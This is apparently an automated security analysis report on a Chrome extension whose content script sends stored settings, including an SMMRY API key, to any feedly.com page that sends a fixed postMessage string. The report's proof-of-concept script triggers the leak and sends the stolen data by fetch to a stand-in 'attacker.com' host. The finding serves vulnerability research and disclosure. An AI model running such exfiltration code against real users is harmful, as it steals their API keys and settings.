# CoCo Analysis: cmocacnmohmfknmmdklpkcmlchpnpkna

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 21 (many duplicates of same vulnerability)

---

## Sink: storage_sync_get_source → window_postMessage_sink (Multiple instances)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cmocacnmohmfknmmdklpkcmlchpnpkna/opgen_generated_files/cs_0.js
Line 394    var storage_sync_get_source = {'key': 'value'};
Lines 509, 528, 566, 573, 577, 581, 585 - Various storage reads
Line 591-605 - window.postMessage with storage data

**Code:**

```javascript
// content.js - Multiple storage reads
chrome.storage.sync.get({"autoClose":true}, function(data){
    autoClose = data.autoClose // ← User setting from storage
})

chrome.storage.sync.get({"smmryApi": ""}, function(data){
    if (data.smmryApi != ""){
        apiSummarize = data.smmryApi // ← Potentially sensitive API key
    }
})

chrome.storage.sync.get({"scrollMod": "parse"}, function(data){
    scrollMod = data.scrollMod
})

chrome.storage.sync.get({"refresh":true}, function(data){
    refresh = data.refresh
})

chrome.storage.sync.get({"refreshPage": false}, function(data){
    refreshPage = data.refreshPage
})

chrome.storage.sync.get({"autoMarkAsReadOptions":"all"}, function(data){
    autoMarkAsReadOptions = data.autoMarkAsReadOptions
})

chrome.storage.sync.get({"autoMarkAsReadOnScroll": false}, function(data){
    autoMarkAsReadOnScroll = data.autoMarkAsReadOnScroll
})

// Message listener - Entry point
window.addEventListener("message", function _content(e) { // ← Any webpage can send messages
    if (e.data.msg === 'This is a dumb way of doing things, but ready to recieve') {
        window.postMessage({ // ← Sends storage data back to webpage
            msg:"Here's the settings data",
            alwaysParse: alwaysParse,
            alwaysSummarize: alwaysSummarize,
            autoClose: autoClose,
            autoMarkAsReadOptions: autoMarkAsReadOptions,
            noContentMob: noContentMob,
            noContentSum: noContentSum,
            apiSummarize: apiSummarize, // ← Potentially sensitive API key sent to webpage
            scrollMod: scrollMod,
            refresh: refresh,
            refreshPage: refreshPage,
            autoMarkAsReadOnScroll: autoMarkAsReadOnScroll
        },"https://feedly.com");
        window.removeEventListener("message", _content)
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (content script message listener)

**Attack:**

```javascript
// From any webpage matching content_scripts (https://feedly.com/*):

// Step 1: Request settings from extension
window.postMessage({
    msg: 'This is a dumb way of doing things, but ready to recieve'
}, '*');

// Step 2: Listen for response with user settings
window.addEventListener('message', function(event) {
    if (event.data.msg === "Here's the settings data") {
        console.log('Leaked extension settings:', event.data);
        console.log('User API key:', event.data.apiSummarize); // ← Steal API key

        // Exfiltrate to attacker server
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(event.data)
        });
    }
});
```

**Impact:** Information disclosure of extension settings to any webpage on feedly.com domain. The extension leaks user configuration including the `apiSummarize` field which may contain a sensitive SMMRY API key. An attacker controlling content on feedly.com (through XSS, compromised account, or malicious content injection) can steal the user's API key and other extension settings. This violates the security boundary between web content and extension data.
